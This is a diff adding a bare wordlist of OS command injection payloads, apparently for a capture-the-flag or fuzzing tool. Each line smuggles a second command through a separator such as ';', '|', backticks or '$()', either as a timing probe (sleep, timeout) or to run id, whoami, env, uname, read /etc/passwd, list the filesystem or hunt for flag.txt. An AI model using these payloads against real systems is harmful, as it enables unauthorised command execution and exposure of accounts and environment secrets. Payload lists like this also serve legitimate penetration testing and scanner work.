@@ -1,0 +1,23 @@
+; sleep 3 #
+| sleep 3 #
+$(sleep 3)
+`sleep 3`
+; sleep 3 ;
+& timeout /t 3 &
+| timeout /t 3
+%0a sleep 3 %0a
+; id
+| id
+$(id)
+`id`
+; cat /etc/passwd
+; cat /flag.txt
+; ls /
+; env
+| env
+$(env)
+; whoami
+| whoami
+; uname -a
+; ls -la /
+; find / -name flag.txt 2>/dev/null
